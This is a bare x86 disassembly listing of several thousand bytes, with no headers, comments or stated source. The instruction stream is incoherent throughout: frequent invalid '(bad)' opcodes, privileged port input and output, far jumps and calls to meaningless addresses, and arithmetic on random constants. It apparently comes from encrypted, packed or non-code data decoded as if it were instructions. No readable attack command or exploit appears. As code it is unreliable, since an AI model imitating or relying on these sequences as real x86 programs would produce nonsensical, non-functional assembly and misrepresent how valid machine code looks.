  402f89:	call   0xb547:0xc1ec0da3
  402f90:	cmp    DWORD PTR [ecx],esp
  402f92:	mov    ds:0x66077a2f,eax
  402f97:	pop    ebp
  402f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f99:	push   ss
  402f9a:	xor    eax,0xd691312c
  402f9f:	mov    ecx,0xf1414a60
  402fa4:	jns    0x402f4a
  402fa6:	fcom   DWORD PTR [esi]
  402fa8:	cwde   
  402fa9:	xchg   ebp,eax
  402faa:	stc    
  402fab:	into   
  402fac:	sub    esp,DWORD PTR [eax]
  402fae:	xor    BYTE PTR [ebp-0x5dd15dbd],0x12
  402fb5:	fldcw  WORD PTR [eax]
  402fb7:	fdiv   QWORD PTR [edi]
  402fb9:	lods   eax,DWORD PTR ds:[esi]
  402fba:	vzeroupper 
  402fbd:	jmp    0x402fe4
  402fbf:	aaa    
  402fc0:	dec    ebp
  402fc1:	sbb    dh,BYTE PTR [edx+0x37a1b0ee]
  402fc7:	stos   DWORD PTR es:[edi],eax
  402fc8:	and    al,BYTE PTR [edx-0x65]
  402fcb:	push   0x69
  402fcd:	inc    ebp
  402fce:	aam    0xea
  402fd0:	out    dx,eax
  402fd1:	popf   
  402fd2:	ret    
  402fd3:	mov    bh,0x8e
  402fd5:	(bad)  
  402fd6:	jg     0x402faa
  402fd8:	dec    ecx
  402fd9:	(bad)  
  402fda:	stc    
  402fdb:	adc    eax,0x7b585663
  402fe0:	in     al,0x9f
  402fe2:	jmp    0xa66d:0x999f78a3
  402fe9:	fsub   QWORD PTR [ebp-0x220b8f22]
  402fef:	mov    esp,0x5b33a1f4
  402ff4:	sub    esi,DWORD PTR [eax-0x2c3197f9]
  402ffa:	jmp    0x8ccf:0xc8a043d7
  403001:	inc    ebp
  403002:	mov    ah,0x98
  403004:	test   DWORD PTR [ebx+0xf],0x528cb7a5
  40300b:	xchg   ecx,eax
  40300c:	and    dl,bl
  40300e:	mov    al,ds:0x9bb01eee
  403013:	or     cl,BYTE PTR [edx]
  403015:	pop    ds
  403016:	aas    
  403017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403018:	mov    esp,0x9dae58c8
  40301d:	in     eax,0x10
  40301f:	mov    DWORD PTR [ecx+ebx*8+0x49],ecx
  403023:	mov    al,ds:0xce5f8564
  403028:	push   edx
  403029:	aad    0x44
  40302b:	lods   eax,DWORD PTR ds:[esi]
  40302c:	xchg   DWORD PTR [eax],edi
  40302e:	xchg   ebp,eax
  40302f:	cmp    esp,esi
  403031:	mov    cl,BYTE PTR [ecx+0x69]
  403034:	and    al,0xf6
  403036:	mov    ch,0x5f
  403038:	jb     0x402ff7
  40303a:	dec    ebx
  40303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40303c:	mov    al,ds:0x261f783b
  403041:	retf   0x8453
  403044:	sub    al,0x19
  403046:	pop    ecx
  403047:	ficomp WORD PTR [eax-0x47f48763]
  40304d:	xor    ebx,DWORD PTR ds:0xe7cb4346
  403053:	xor    DWORD PTR [esi],eax
  403055:	or     bh,bl
  403057:	fsub   st(7),st
  403059:	out    0xfd,eax
  40305b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40305c:	push   cs
  40305d:	imul   esi,eax,0xa
  403060:	fist   WORD PTR [ecx-0x748270da]
  403066:	addr16 dec edx
  403068:	(bad)  
  403069:	and    ebp,DWORD PTR [ebx+eiz*4+0x2e6ade07]
  403070:	std    
  403071:	add    eax,0x3df593e2
  403076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403077:	pop    esi
  403078:	mov    eax,DWORD PTR [ecx+edi*8]
  40307b:	jg     0x4030a5
  40307d:	rol    ch,1
  40307f:	std    
  403080:	shl    DWORD PTR [ebx+0x336ce532],1
  403086:	sbb    BYTE PTR [eax-0x1f],dl
  403089:	sub    eax,0xd330e439
  40308e:	lea    esp,[eax]
  403090:	cwde   
  403091:	pushf  
  403092:	xchg   edx,eax
  403093:	push   ds
  403094:	call   0xfe950d53
  403099:	fst    st(3)
  40309b:	sub    BYTE PTR [edx],0x79
  40309e:	pop    edi
  40309f:	pop    ss
  4030a0:	xchg   edx,eax
  4030a1:	add    al,0xec
  4030a3:	mov    bl,0x1c
  4030a5:	js     0x403054
  4030a7:	xor    eax,0xc6fc69ca
  4030ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030ad:	cmp    al,0x1a
  4030af:	cli    
  4030b0:	add    edx,DWORD PTR ds:0x7eb41a9
  4030b6:	add    al,0x78
  4030b8:	sub    DWORD PTR [esp+0x1cb4ffe4],esp
  4030bf:	xchg   edx,eax
  4030c0:	(bad)  
  4030c1:	sbb    DWORD PTR ss:[edi],ebp
  4030c4:	xor    DWORD PTR [edi+0x36],eax
  4030c7:	test   al,0x2d
  4030c9:	xor    ebx,DWORD PTR [eax+eiz*2+0x5f03c693]
  4030d0:	scas   al,BYTE PTR es:[edi]
  4030d1:	mov    ah,0x9f
  4030d3:	ins    BYTE PTR es:[edi],dx
  4030d4:	mov    al,0xaa
  4030d6:	leave  
  4030d7:	test   eax,0xcc5ccd16
  4030dc:	push   ecx
  4030dd:	pop    edx
  4030de:	fmul   QWORD PTR [ecx]
  4030e0:	nop
  4030e1:	test   eax,0xbb6fec41
  4030e6:	xchg   ecx,eax
  4030e8:	push   ds
  4030e9:	hlt    
  4030ea:	into   
  4030eb:	inc    ebp
  4030ec:	(bad)  
  4030ed:	(bad)  
  4030ee:	out    dx,al
  4030ef:	dec    eax
  4030f0:	dec    eax
  4030f1:	outs   dx,DWORD PTR ds:[esi]
  4030f2:	in     al,0x68
  4030f4:	mov    al,ds:0x718e05ed
  4030f9:	ja     0x403160
  4030fb:	push   ebp
  4030fc:	je     0x403099
  4030fe:	std    
  4030ff:	jnp    0x40313c
  403101:	push   ebx
  403102:	inc    esi
  403103:	(bad)  
  403104:	mov    al,0x89
  403106:	and    cl,dh
  403108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403109:	stos   DWORD PTR es:[edi],eax
  40310a:	ret    0x82c6
  40310d:	shr    BYTE PTR [ebp-0x2f68427f],0xb9
  403114:	retw   0x24e0
  403118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403119:	or     eax,0x8768d5c7
  40311e:	in     eax,0xa
  403120:	or     BYTE PTR [ebx+ebx*8],dl
  403123:	popf   
  403124:	movnti DWORD PTR ds:0xc352673d,eax
  40312b:	mov    bh,0xb3
  40312d:	cmp    eax,0x6a3a2ea1
  403132:	into   
  403133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403134:	jmp    0x837b7b6c
  403139:	or     ebx,esi
  40313b:	sub    al,0x38
  40313d:	or     al,BYTE PTR [ebx+0x79]
  403140:	bound  edi,QWORD PTR [ebp+0x2311dce0]
  403146:	jmp    FWORD PTR [esi]
  403148:	mov    ebx,0x7cb8c11c
  40314d:	neg    DWORD PTR [edx+0x5a]
  403150:	call   0x9c020f57
  403155:	and    eax,0x59a57748
  40315a:	mov    esp,0x188cf28c
  40315f:	retf   
  403160:	xor    BYTE PTR [eax],dh
  403162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403163:	xchg   DWORD PTR [eax+0x17b98c6a],esi
  403169:	or     ecx,eax
  40316b:	jge    0x403173
  40316d:	arpl   WORD PTR [edi+edi*2+0x7e],sp
  403171:	fdivr  DWORD PTR [ecx+0x6c692d2b]
  403177:	loope  0x4031b5
  403179:	or     BYTE PTR [eax-0x454d0c65],bl
  40317f:	data16 jno 0x40313b
  403182:	jg     0x403129
  403184:	in     eax,dx
  403185:	xchg   DWORD PTR [eax],ebp
  403187:	push   ebx
  403188:	stc    
  403189:	push   0xffffff9e
  40318b:	popf   
  40318c:	sti    
  40318d:	cmp    eax,0x64a0870a
  403192:	jl     0x4031c4
  403194:	aaa    
  403195:	sbb    al,0x97
  403197:	imul   ebp,DWORD PTR [esi-0x47dcf2b6],0xffffff82
  40319e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319f:	sub    eax,0x2d2800da
  4031a4:	scas   eax,DWORD PTR es:[edi]
  4031a5:	push   0xa4fc397f
  4031aa:	(bad)  
  4031ab:	in     eax,dx
  4031ac:	ret    
  4031ad:	pop    edx
  4031ae:	mov    BYTE PTR [esi+ecx*2-0x573031ae],al
  4031b5:	imul   ebx,DWORD PTR [ebx-0x23032338],0xe5e95b9
  4031bf:	cmp    BYTE PTR [edi-0x21],cl
  4031c2:	mov    esp,0x5159c9f1
  4031c7:	lea    esp,[edx+0x16abb8e9]
  4031cd:	add    edi,DWORD PTR [ecx-0x1b]
  4031d0:	and    al,0xbf
  4031d2:	jmp    0x52639ffb
  4031d7:	jne    0x40317a
  4031d9:	mov    cl,0x76
  4031db:	lahf   
  4031dc:	(bad)  
  4031dd:	push   esp
  4031de:	and    BYTE PTR [esi-0x5528ee10],ah
  4031e4:	dec    ebp
  4031e5:	jb     0x4031a7
  4031e7:	jne    0x403195
  4031e9:	fidiv  WORD PTR [esi]
  4031eb:	mov    ss:0xb96d92a9,eax
  4031f1:	loopne 0x40319d
  4031f3:	add    ebx,edx
  4031f5:	pop    ebx
  4031f6:	pop    ds
  4031f7:	std    
  4031f8:	(bad)  
  4031f9:	jmp    0x4031fd
  4031fb:	push   eax
  4031fc:	xchg   ecx,eax
  4031fd:	cli    
  4031fe:	outs   dx,DWORD PTR ds:[esi]
  4031ff:	xlat   BYTE PTR ds:[ebx]
  403200:	sub    eax,0x4428c40
  403205:	adc    esi,ebp
  403207:	sbb    ecx,eax
  403209:	cmp    ebp,DWORD PTR [edi+ebx*1]
  40320c:	sub    al,0x5e
  40320e:	pop    ecx
  40320f:	div    BYTE PTR [esi-0x33]
  403212:	xchg   ebx,eax
  403213:	push   ds
  403214:	stc    
  403215:	adc    eax,DWORD PTR [eax+0xb]
  403218:	(bad)  
  403219:	fdiv   DWORD PTR [ebx+0x19]
  40321c:	push   0x197aec5b
  403221:	test   DWORD PTR [edx-0x3],esi
  403224:	xor    esp,DWORD PTR [ecx]
  403226:	adc    BYTE PTR [esi+0x7c2697d6],al
  40322c:	loope  0x403248
  40322e:	jg     0x403234
  403230:	fiadd  WORD PTR [ebx+0x6ed61593]
  403236:	jge    0x4032a9
  403238:	and    BYTE PTR [edx-0x49d57238],0xb4
  40323f:	aad    0x24
  403241:	clc    
  403242:	ja     0x403214
  403244:	dec    esp
  403245:	jne    0x4032bd
  403247:	aas    
  403248:	pop    eax
  403249:	popf   
  40324a:	shl    BYTE PTR [ecx],cl
  40324c:	rcl    DWORD PTR [eax],1
  40324e:	sbb    BYTE PTR [edx],dl
  403250:	pop    ss
  403251:	shr    ecx,0xc1
  403254:	out    dx,eax
  403255:	stc    
  403256:	sub    ebx,DWORD PTR [ebx-0x80]
  403259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40325a:	jge    0x4032aa
  40325c:	push   di
  40325e:	sbb    BYTE PTR [ecx+0x33396186],al
  403264:	cwde   
  403265:	ins    DWORD PTR es:[edi],dx
  403266:	loopne 0x403220
  403268:	pop    ebp
  403269:	push   ecx
  40326a:	or     DWORD PTR [edi-0xb],eax
  40326d:	stc    
  40326e:	cdq    
  40326f:	hlt    
  403270:	call   0x2504ebc9
  403275:	sbb    BYTE PTR [esi],bh
  403277:	(bad)  
  403278:	and    bh,ch
  40327a:	outs   dx,DWORD PTR ds:[esi]
  40327b:	fld    TBYTE PTR [ebp+eiz*2-0x489df423]
  403282:	xchg   esi,eax
  403283:	fst    DWORD PTR [eax]
  403285:	in     al,0x1b
  403287:	cmp    eax,0x44a52569
  40328c:	pusha  
  40328d:	les    ebx,FWORD PTR [esi+0x30]
  403290:	test   DWORD PTR [eax],0xf330da7d
  403296:	stos   DWORD PTR es:[edi],eax
  403297:	push   ds
  403298:	stos   BYTE PTR es:[edi],al
  403299:	imul   ecx,edi,0xffffffc7
  40329c:	adc    ebx,DWORD PTR [edx+0x389b0311]
  4032a2:	jo     0x403288
  4032a4:	test   bh,0xa9
  4032a7:	push   esp
  4032a8:	push   esp
  4032a9:	das    
  4032aa:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4032ac:	xchg   esi,eax
  4032ad:	xchg   esp,eax
  4032ae:	inc    edi
  4032af:	inc    ebx
  4032b0:	pop    es
  4032b1:	mov    edx,0x28a77b97
  4032b6:	pop    ss
  4032b7:	fmul   DWORD PTR [eax+0x71972743]
  4032bd:	adc    DWORD PTR [ebx+0x53e02bb8],0x7377a35b
  4032c7:	sar    al,cl
  4032c9:	bndstx gs:[edx],bnd2
  4032cd:	push   eax
  4032ce:	mov    ecx,0xd04b575
  4032d3:	cmp    eax,0x2e07eae0
  4032d8:	and    al,0xf9
  4032da:	fucomp st(4)
  4032dc:	add    BYTE PTR [ecx-0x33],ch
  4032df:	iret   
  4032e0:	add    BYTE PTR [eax-0x33578cdb],cl
  4032e6:	xor    eax,esi
  4032e8:	repz (bad) cs:[edi-0x4a]
  4032ed:	cmp    eax,0x27855bd4
  4032f2:	push   cs
  4032f3:	or     ebx,DWORD PTR [ebp-0x4]
  4032f6:	and    eax,0x673ee44f
  4032fb:	dec    edx
  4032fc:	sbb    bh,BYTE PTR [ebp+0x22]
  4032ff:	pop    eax
  403300:	scas   eax,DWORD PTR es:[edi]
  403301:	ins    BYTE PTR es:[edi],dx
  403302:	xchg   ecx,eax
  403303:	icebp  
  403304:	lock jnp 0x403339
  403307:	sub    al,0x73
  403309:	das    
  40330a:	ss (bad) 
  40330c:	fwait
  40330d:	test   eax,0x5069ceb6
  403312:	loope  0x403391
  403314:	test   edi,edi
  403316:	inc    edx
  403317:	loope  0x403318
  403319:	jae    0x40331a
  40331b:	xor    al,0x5a
  40331d:	call   0xde90:0x5d8882dc
  403324:	jge    0x4032b3
  403326:	and    al,0x55
  403328:	sti    
  403329:	repnz xor bh,BYTE PTR [eax]
  40332c:	mov    ds:0x7deb641d,al
  403331:	push   ebp
  403332:	fcomp  QWORD PTR [edi]
  403334:	ficomp WORD PTR [esi-0x7795f888]
  40333a:	(bad)  
  40333b:	loope  0x4032df
  40333d:	imul   ebp,ebx,0x6e0661fc
  403343:	push   ss
  403344:	ror    BYTE PTR [eax-0x58789971],0xa
  40334b:	iret   
  40334c:	or     al,0x58
  40334e:	inc    edx
  40334f:	and    BYTE PTR [esi+0xa],dh
  403352:	sbb    BYTE PTR [esp+eax*8+0x26],ch
  403356:	and    eax,0x3e94c823
  40335b:	clc    
  40335c:	fwait
  40335d:	jp     0x40330e
  40335f:	push   ss
  403360:	jp     0x4033d5
  403362:	aad    0xdc
  403364:	jl     0x40334d
  403366:	pop    es
  403367:	inc    esp
  403368:	fistp  WORD PTR [eax-0x41371bae]
  40336e:	shr    BYTE PTR [esi+0x5f],0x27
  403372:	je     0x403393
  403374:	add    DWORD PTR [ebp+0x66],esi
  403377:	adc    al,0x99
  403379:	stos   BYTE PTR es:[edi],al
  40337a:	pop    eax
  40337b:	add    dl,ch
  40337d:	sub    ebp,edi
  40337f:	push   eax
  403380:	xchg   esi,eax
  403381:	add    BYTE PTR [ecx+edx*4],al
  403384:	jne    0x4033f9
  403386:	sub    eax,0x68ca7227
  40338b:	jmp    0x9eba5463
  403390:	nop
  403391:	scas   al,BYTE PTR es:[edi]
  403392:	pop    eax
  403393:	repz loopne 0x40338a
  403396:	jnp    0x4033cf
  403398:	pop    ebp
  403399:	in     al,0x6a
  40339b:	sahf   
  40339c:	popf   
  40339d:	retf   
  40339e:	aas    
  40339f:	sahf   
  4033a0:	push   esp
  4033a1:	gs lock dec ecx
  4033a4:	ret    0xb61d
  4033a7:	push   edx
  4033a8:	jecxz  0x4033ec
  4033aa:	push   eax
  4033ab:	fisttp QWORD PTR [ebp+esi*4+0x5d2b2e46]
  4033b2:	fcmovb st,st(1)
  4033b4:	and    DWORD PTR [esi+0x1f4e457c],ebp
  4033ba:	test   DWORD PTR [edx],edi
  4033bc:	mov    BYTE PTR [esi+0x68efc58d],bl
  4033c2:	pop    ebx
  4033c3:	dec    ebp
  4033c4:	fild   QWORD PTR [edx+0x5d4925ae]
  4033ca:	rcl    DWORD PTR [ebx+0x104aeeea],cl
  4033d0:	test   DWORD PTR [edx],edi
  4033d2:	jne    0x403366
  4033d4:	loop   0x403371
  4033d6:	aas    
  4033d7:	not    BYTE PTR [edx+0x5c]
  4033da:	cmp    dl,0x38
  4033dd:	jne    0x40340c
  4033df:	push   edi
  4033e1:	sahf   
  4033e2:	lahf   
  4033e3:	in     eax,0x9
  4033e5:	setle  BYTE PTR [edi+0x34]
  4033e9:	loopne 0x403468
  4033eb:	stc    
  4033ec:	aad    0xb6
  4033ee:	lds    edx,FWORD PTR [eax]
  4033f0:	sahf   
  4033f1:	icebp  
  4033f2:	sbb    ch,BYTE PTR ds:0x9a2a7a0f
  4033f8:	sub    eax,0xdd15f72c
  4033fd:	cdq    
  4033fe:	(bad)  
  4033ff:	sub    BYTE PTR [ecx],dh
  403401:	or     BYTE PTR [ecx],0xee
  403404:	fild   DWORD PTR [esi+0x52]
  403407:	shr    DWORD PTR [esi],0xcd
  40340a:	arpl   WORD PTR [edi-0x75],ax
  40340d:	fild   DWORD PTR [edi-0x1a]
  403410:	leave  
  403411:	dec    edx
  403412:	loopne 0x40343e
  403414:	and    dl,BYTE PTR ds:0x518df5a6
  40341a:	sbb    eax,0x59d2c5aa
  40341f:	sar    ch,1
  403421:	jns    0x40344d
  403423:	fist   DWORD PTR [eax+0x7d23daab]
  403429:	stos   DWORD PTR es:[edi],eax
  40342a:	repz jmp 0x40343f
  40342d:	ins    BYTE PTR es:[edi],dx
  40342e:	push   ebx
  40342f:	sti    
  403430:	aas    
  403431:	data16 mov cs,WORD PTR [esi]
  403434:	jmp    0x69c8f3e3
  403439:	pop    esp
  40343a:	fcomp  DWORD PTR [edi-0xb28af9e]
  403440:	bound  esi,QWORD PTR [ebx-0x45]
  403443:	mov    bh,0xe6
  403445:	retf   
  403446:	dec    esp
  403447:	inc    esi
  403448:	imul   BYTE PTR [edi]
  40344a:	xchg   BYTE PTR [esi-0x6c37cc62],bh
  403450:	into   
  403451:	mov    eax,ds:0xfb0d59c8
  403456:	jne    0x40344d
  403458:	or     ebp,DWORD PTR [ebp+0x56239a01]
  40345e:	jae    0x403465
  403460:	pop    esp
  403461:	mov    eax,ds:0xc1ce2844
  403466:	dec    esp
  403467:	fmul   DWORD PTR [edx]
  403469:	mov    eax,0x1608b9dd
  40346e:	test   al,0x22
  403470:	jbe    0x403493
  403472:	or     dh,BYTE PTR [ebx+0x52a976b5]
  403478:	adc    ah,BYTE PTR [esi-0x53c3f589]
  40347e:	mov    al,ds:0x94fd9924
  403483:	jb     0x4034f2
  403485:	lods   eax,DWORD PTR ds:[esi]
  403486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403487:	mov    WORD PTR [esi+ebx*4-0x1f392c82],ds
  40348e:	fist   DWORD PTR [eax]
  403490:	lock inc edx
  403492:	lea    edi,[edx+edx*2+0x3c]
  403496:	mov    bh,al
  403498:	lahf   
  403499:	mov    ecx,0xe7066daf
  40349e:	loope  0x403455
  4034a0:	fisubr WORD PTR [edx]
  4034a2:	sbb    al,BYTE PTR [esi+0x5990d979]
  4034a8:	(bad)  
  4034aa:	fwait
  4034ab:	gs xchg ebx,eax
  4034ad:	jecxz  0x4034c0
  4034af:	or     edx,DWORD PTR [esi-0x43]
  4034b2:	mov    al,0x81
  4034b4:	mov    eax,0x4e5a389b
  4034b9:	inc    edx
  4034ba:	call   0xf207:0xe050ea0b
  4034c1:	or     eax,0x7924f009
  4034c6:	xor    BYTE PTR [edi-0x7cfb85ac],dh
  4034cc:	imul   BYTE PTR ds:0xf8311f3b
  4034d2:	sbb    esi,edi
  4034d4:	iret   
  4034d5:	cs mov al,0x75
  4034d8:	mov    al,0xa8
  4034da:	xchg   ebp,eax
  4034db:	xor    BYTE PTR [eax-0x2a],0x9f
  4034df:	sub    eax,DWORD PTR [edx+0x34]
  4034e2:	dec    esp
  4034e3:	mov    edx,0xe3ec3c37
  4034e8:	adc    al,0xb8
  4034ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034eb:	cmp    al,0xc
  4034ed:	inc    ecx
  4034ee:	pop    ecx
  4034ef:	and    ch,BYTE PTR [esi+0x32556dc2]
  4034f5:	sbb    edi,esp
  4034f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f8:	cld    
  4034f9:	(bad)  
  4034fa:	sub    ebx,DWORD PTR [ebx]
  4034fc:	daa    
  4034fd:	push   esp
  4034fe:	xor    DWORD PTR [edx],esp
  403500:	sub    ebp,DWORD PTR [edx]
  403502:	cmc    
  403503:	add    eax,0xb548ec3a
  403508:	not    BYTE PTR [ecx-0x3985a83]
  40350e:	mov    ds:0x63d2f5ea,al
  403513:	mov    al,0xfd
  403515:	or     eax,DWORD PTR [ebx-0x54]
  403518:	loopne 0x403570
  40351a:	lea    dx,ds:0xcd8f544e
  403521:	popf   
  403522:	scas   al,BYTE PTR es:[edi]
  403523:	cmp    DWORD PTR [eax-0x728eec34],ecx
  403529:	dec    ebp
  40352a:	pop    edi
  40352b:	jo     0x4035a3
  40352d:	idiv   BYTE PTR [eax]
  40352f:	or     dh,BYTE PTR [ebx-0x48a5fd6]
  403535:	test   al,0xcd
  403537:	lods   al,BYTE PTR ds:[esi]
  403538:	ss leave 
  40353a:	(bad)  
  40353b:	cld    
  40353c:	add    BYTE PTR [ebx],0x5b
  40353f:	push   esi
  403540:	std    
  403541:	sub    BYTE PTR [esi],bl
  403543:	or     BYTE PTR [ebp+0x48],bl
  403546:	dec    esi
  403547:	mov    dh,0xc0
  403549:	(bad)  [edi+0x1402df0a]
  40354f:	iret   
  403550:	and    DWORD PTR [edx],0xa4ab035f
  403556:	in     al,0xd2
  403558:	inc    edi
  403559:	in     eax,dx
  40355a:	int    0xf4
  40355c:	dec    ebx
  40355d:	mov    DWORD PTR [ecx],ecx
  40355f:	rcr    DWORD PTR [ebp+eax*2+0x1529b350],0xa7
  403567:	pop    eax
  403568:	pop    ebp
  403569:	pop    es
  40356a:	sbb    BYTE PTR [esi],dh
  40356c:	xlat   BYTE PTR ds:[ebx]
  40356d:	sub    edx,DWORD PTR [eax-0x27b79dc]
  403573:	cwde   
  403574:	(bad)  [edx]
  403576:	cmp    ch,BYTE PTR [esi]
  403578:	push   ebp
  403579:	or     al,bl
  40357b:	scas   eax,DWORD PTR es:[edi]
  40357c:	push   ecx
  40357d:	outs   dx,BYTE PTR ds:[esi]
  40357e:	inc    esp
  40357f:	icebp  
  403580:	stos   DWORD PTR es:[edi],eax
  403581:	add    BYTE PTR [edi+eax*2-0x59],0x64
  403586:	and    eax,0xd614c36f
  40358b:	sub    eax,edx
  40358d:	sub    DWORD PTR [edx+0x3],ebx
  403590:	jl     0x4035a0
  403592:	and    bh,BYTE PTR [ecx-0xd1ee365]
  403598:	(bad)  
  40359a:	push   ds
  40359b:	xor    eax,0x9333ef58
  4035a0:	jmp    0x403559
  4035a2:	cmp    eax,0x7e172bad
  4035a7:	mov    gs,eax
  4035a9:	outs   dx,BYTE PTR ds:[esi]
  4035aa:	xor    ch,dh
  4035ac:	jmp    0x62dc:0xf44843f9
  4035b3:	adc    eax,0x6c3183d
  4035b8:	sti    
  4035b9:	sub    ebp,DWORD PTR [edi+0x3cc97c9a]
  4035bf:	lods   eax,DWORD PTR ds:[esi]
  4035c0:	or     BYTE PTR [esi+0x386c2d08],bh
  4035c6:	mov    ebx,0xff2f3508
  4035cb:	push   ebx
  4035cc:	and    esp,DWORD PTR [ebx-0x22]
  4035cf:	clc    
  4035d0:	sbb    esp,DWORD PTR [edi-0x3f]
  4035d3:	sub    al,0x8f
  4035d5:	ins    DWORD PTR es:[edi],dx
  4035d6:	shl    BYTE PTR [ebp-0x4f],1
  4035d9:	fild   WORD PTR [esi+0x48c727bd]
  4035df:	pop    ebp
  4035e0:	test   al,0x20
  4035e2:	pop    edi
  4035e3:	add    eax,0x97bdd41f
  4035e8:	out    0xab,eax
  4035ea:	retf   
  4035eb:	and    BYTE PTR [esi+0x1d],cl
  4035ee:	aas    
  4035ef:	or     DWORD PTR [ebx],ecx
  4035f1:	out    dx,eax
  4035f2:	sbb    dh,BYTE PTR [ebx-0xd6f5037]
  4035f8:	inc    ebp
  4035f9:	jmp    0xaee2:0x4ac31ce0
  403600:	pop    eax
  403601:	xchg   DWORD PTR [si-0x3a],eax
  403605:	jae    0x40367f
  403607:	mul    BYTE PTR [si+0x6066]
  40360c:	mov    BYTE PTR [esi],ah
  40360e:	push   0x8ecbe415
  403613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403614:	(bad)  
  403615:	xor    bh,BYTE PTR [eax+0x6]
  403618:	inc    ecx
  403619:	loope  0x403670
  40361b:	imul   ebx,DWORD PTR gs:[esi-0x2f],0x4d
  403620:	add    esi,DWORD PTR [esi-0x762a20ca]
  403626:	(bad)  
  403627:	jae    0x40365b
  403629:	push   ebp
  40362a:	xchg   DWORD PTR [eax+0x347da14e],ebp
  403630:	add    esi,DWORD PTR [edx-0x2636600d]
  403636:	adc    BYTE PTR [ecx+0x10e66c25],bl
  40363c:	out    dx,al
  40363d:	lds    ebp,FWORD PTR [ecx+0x20ba0fc]
  403643:	mov    ebp,0x3552f8a0
  403648:	xor    eax,DWORD PTR [edx+0x27]
  40364b:	pop    ds
  40364c:	pop    esp
  40364d:	push   eax
  40364e:	sub    DWORD PTR [ebx+0x995bc28],ecx
  403654:	sbb    eax,0xe0c90bab
  403659:	inc    edx
  40365a:	loope  0x403639
  40365c:	into   
  40365d:	mov    ebx,0x205ff141
  403662:	lods   al,BYTE PTR ds:[esi]
  403663:	jecxz  0x40367b
  403665:	adc    ah,BYTE PTR ds:0xabec0a01
  40366b:	cmp    eax,0xecd14df0
  403670:	inc    esp
  403671:	call   0x232aa6e7
  403676:	fidivr DWORD PTR [esi+0x9]
  403679:	jle    0x40365e
  40367b:	cmp    BYTE PTR [ecx+0x6c2ddbc0],bl
  403681:	mov    gs,WORD PTR [esi]
  403683:	mul    BYTE PTR [esi+eiz*8-0x60]
  403687:	jns    0x403620
  403689:	or     edx,DWORD PTR [edi+esi*2+0x18390194]
  403690:	push   cs
  403691:	dec    esi
  403692:	xor    al,0x94
  403694:	outs   dx,BYTE PTR ds:[esi]
  403695:	stos   DWORD PTR es:[edi],eax
  403696:	adc    DWORD PTR [edi+edi*8-0x5acead90],edi
  40369d:	(bad)  
  40369e:	stc    
  40369f:	ret    
  4036a0:	ror    BYTE PTR [ecx+0x7b9bbe6a],1
  4036a6:	dec    esp
  4036a7:	pop    edi
  4036a8:	(bad)  
  4036a9:	xor    ecx,edx
  4036ab:	stc    
  4036ac:	jo     0x403675
  4036ae:	pop    ebx
  4036af:	icebp  
  4036b0:	ins    DWORD PTR es:[edi],dx
  4036b1:	mov    dl,0x61
  4036b3:	ds xchg edx,edi
  4036b6:	nop
  4036b7:	cwde   
  4036b8:	jp     0x40364e
  4036ba:	gs retf 0xd34f
  4036be:	jecxz  0x40367c
  4036c0:	xor    BYTE PTR [edi-0x4fde3915],al
  4036c6:	mov    edx,0x66f9ce31
  4036cb:	test   eax,0x1d2f7b48
  4036d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036d1:	sbb    DWORD PTR [edx+ecx*1-0x4d23c44f],esi
  4036d8:	mov    ebx,0xb3fae6e8
  4036dd:	inc    ebx
  4036de:	dec    ecx
  4036df:	mov    ah,0xec
  4036e1:	test   ebx,edx
  4036e3:	mov    eax,0x1eaa090e
  4036e8:	adc    bl,bl
  4036ea:	push   esi
  4036eb:	and    dl,BYTE PTR [ebx+eiz*1+0x45]
  4036ef:	sub    eax,0xa9029320
  4036f4:	mov    edx,0x57c6e6d5
  4036f9:	aam    0xf9
  4036fb:	cmc    
  4036fc:	mov    ds:0x607ce08a,al
  403701:	scas   eax,DWORD PTR es:[edi]
  403702:	adc    eax,DWORD PTR [ecx]
  403704:	pop    esi
  403705:	data16 mov cl,0xf
  403708:	mov    dh,0xdc
  40370a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40370b:	inc    ebx
  40370c:	pop    edx
  40370d:	sbb    eax,0x92dafb66
  403712:	push   esp
  403713:	xchg   esi,eax
  403714:	fwait
  403715:	dec    ebp
  403716:	jp     0x4036cf
  403718:	stos   DWORD PTR es:[edi],eax
  403719:	rcl    BYTE PTR [esi],0x3e
  40371c:	test   al,0x8c
  40371e:	(bad)  
  40371f:	lods   al,BYTE PTR ds:[esi]
  403720:	stos   DWORD PTR es:[edi],eax
  403721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403722:	adc    dl,al
  403724:	mov    ebp,0xd547946
  403729:	daa    
  40372a:	test   BYTE PTR [esi+ecx*1+0x17e03c21],bh
  403731:	jmp    0x403768
  403733:	and    edi,ecx
  403735:	dec    eax
  403736:	sbb    BYTE PTR [ebx+0x68d5b6fe],al
  40373c:	into   
  40373d:	inc    eax
  40373e:	push   ebp
  40373f:	xchg   BYTE PTR [esi-0x367eec79],dl
  403745:	ja     0x403772
  403747:	and    al,BYTE PTR [esi+0x66]
  40374a:	mov    cl,0x70
  40374c:	lahf   
  40374d:	imul   ebx,DWORD PTR [edx-0x2dbbc5db],0xf008ab63
  403757:	cdq    
  403758:	add    BYTE PTR [ebx],ch
  40375a:	or     BYTE PTR [edi-0x23373184],al
  403760:	mov    esp,0xe6160b65
  403765:	sbb    DWORD PTR [esp+ebx*8+0x38e07297],ebx
  40376c:	xchg   ebp,eax
  40376d:	mov    esp,0xe1a3e5a6
